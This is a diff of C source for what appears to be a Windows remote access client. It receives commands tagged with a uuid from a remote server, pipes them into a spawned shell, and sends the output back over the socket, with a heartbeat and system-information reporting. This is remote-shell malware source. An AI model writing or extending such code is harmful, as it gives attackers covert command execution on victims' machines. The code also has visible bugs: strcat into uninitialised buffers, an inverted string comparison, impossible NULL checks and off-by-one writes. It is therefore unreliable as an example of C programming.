@@ -572,9 +572,10 @@ char* getSystemInfomation(char* systeminfo){
 void Clock(void *par){
 
 }
-void ShellThread(int i){
+void ShellThread(void *par){
     // i是数组下标，全局变量SHELL的下标
     
+    int i = (int)par;
     int ret;
     char Buff[1024]; 
     SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
@@ -599,8 +600,9 @@ void ShellThread(int i){
 
     unsigned long lBytesRead; 
     
-    while (SHELL[i].live) 
+    while ((SHELL+i)->live) 
     { 
+        printf("H");
         ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
         while(lBytesRead) 
         { 
@@ -610,34 +612,39 @@ void ShellThread(int i){
             if (!ret) {
                 break;
             }
+            printf("uuid:%s",(SHELL+i)->uuid);
             struct CMSG msg = {
                 .sign =  "customize",
                 .mod = SERVER_SHELL_CHANNEL,
-                .l = lBytesRead+strlen(SHELL[i].uuid)+2,
+                .l = lBytesRead+strlen((SHELL+i)->uuid)+2,
              };
-            char * s_pck = malloc(lBytesRead+strlen(SHELL[i].uuid)+2);
-            strcat(s_pck,SHELL[i].uuid);
+            char * s_pck = malloc(lBytesRead+strlen((SHELL+i)->uuid)+2);
+            strcat(s_pck,(SHELL+i)->uuid);
             strcat(s_pck,"|");
             strcat(s_pck,Buff);
             strcat(s_pck,'\0');
-            send(SHELL[i].socks,(char*)&msg,sizeof(struct CMSG),0);
-            ret=send(SHELL[i].socks,s_pck,lBytesRead+strlen(SHELL[i].uuid)+2,0);
+            send((SOCKET)(SHELL+i)->socks,(char*)&msg,sizeof(struct CMSG),0);
+            ret=send((SOCKET)(SHELL+i)->socks,s_pck,lBytesRead+strlen((SHELL+i)->uuid)+2,0);
             ZeroMemory(Buff,1024);
             if (ret<=0) {struct CMSG emsg = {
                     .sign =  "customize",
                     .mod = SERVER_RESET,
                     .l = 0
                     };
-                    send(SHELL[i].socks,(char*)&emsg,sizeof(struct CMSG),0);
+                    send((SHELL+i)->socks,(char*)&emsg,sizeof(struct CMSG),0);
                     break;}; 
         }
        
-        if(SHELL[i].in_buff != NULL){
-            ret=WriteFile(hWritePipe2,SHELL[i].in_buff,lBytesRead,&lBytesRead,0);
-            SHELL[i].in_buff = NULL;
+        if(*(SHELL+i)->in_buff != NULL){
+            printf("no_CMD:%s",(SHELL+i)->in_buff);
+            ret=WriteFile(hWritePipe2,(SHELL+i)->in_buff,lBytesRead,&lBytesRead,0);
+            free((SHELL+i)->in_buff);
+            *(SHELL+i)->in_buff=NULL;
         }
     }
-    free(SHELL[i]);
+    printf("aswl");
+    free((SHELL+i)->uuid);
+    free(SHELL+i);
     return;
 }
 void Hearts(void *sock){
@@ -759,7 +766,7 @@ void Handle(){
                 // CMD命令
                 char * cmd_shell = malloc(msg.l+1);
                 ret = recv(sock,cmd_shell,msg.l,0);
-                cmd_shell[msg.l+1]="\00";
+                cmd_shell[  msg.l+1]="\00";
                 printf("Recv CMD:%s",cmd_shell);
                 char * uuid = strtok(cmd_shell,"|");
                 if(uuid == NULL){
@@ -769,32 +776,67 @@ void Handle(){
                 char * cmd = strtok(NULL, "|");
                 printf("cmd:%s\n", cmd);
                 for(int i=0;i<=SHELL_SIZE;i++){
-                    if (strcmp(((struct CSHELL *)SHELL[i])->uuid,uuid)){
-                        //收到cmd命令，重置定时器并且把数据丢到chan里面
-                        
-	                    t = time(NULL);
-                        SHELL[i]->in_buff = cmd;
-                        SHELL[i]->live = time(&t);
-                        goto end;
+                    if(SHELL!= NULL || SHELL+i != NULL){
+                        if (strcmp((SHELL+i)->uuid,uuid)){
+                            printf("Find Thread:%s",(SHELL+i)->uuid);
+                            //收到cmd命令，重置定时器并且把数据丢到chan里面
+                            t = time(NULL);
+                            (SHELL+i)->in_buff = cmd;
+                            (SHELL+i)->live = time(&t);
+                            goto end;
+                        }
                     }
+                    
                 }
+                char * nodie_uuid = malloc(strlen(uuid));
+                char * nodie_cmd = malloc(strlen(cmd));
+                strcpy(nodie_uuid,uuid);
+                strcpy(nodie_cmd,cmd);
                 // 不存在线程，新建一个
                 struct CSHELL S = {
-                    .uuid = uuid,
+                    .uuid = nodie_uuid,
                     .time = time(NULL),
-                    .in_buff = cmd,
+                    .in_buff = nodie_cmd,
                     .live = TRUE,
                     .socks = sock,
                 };
                 
+                int p ;
                 for(int i=0;i<=SHELL_SIZE;i++){
-                    if(SHELL[i]==NULL){
-
+                    if(SHELL != NULL){
+                        if((SHELL+i)==NULL){
+                            *(SHELL+i) = S;
+                            p=i;
+                            // 可能会被回收，阿拉不管了
+                        }
                     }
                 }
-                _beginthread(Hearts,0,(void *)sock);
+                
+                //插空失败，那就新建一个
+                struct CSHELL *old_ptr = SHELL;
+                SHELL = (struct CSHELL *)malloc((SHELL_SIZE+1)*sizeof(struct CSHELL));
+                if (SHELL == NULL){
+                    //失败，就当无事发生
+                    continue;
+                }
+                if(old_ptr != NULL){
+                    for(int i=0;i<=SHELL_SIZE-1;i++){
+                        *(SHELL+i) = *(old_ptr+i);
+                    }
+                }
+                
+                
+                SHELL_SIZE+=1;
+                
+                
+                *(SHELL+SHELL_SIZE-1)=S;
+                p=SHELL_SIZE-1;
+                free(old_ptr);
+                _beginthread(ShellThread,0,(void *)p);
+                
                 end:
                 free(cmd_shell);
+
                 continue;
             }
                 
@@ -810,8 +852,8 @@ void Handle(){
                 continue;
         }
         free(address);
+        
     }
-    
     close(sock);
     return;
 }
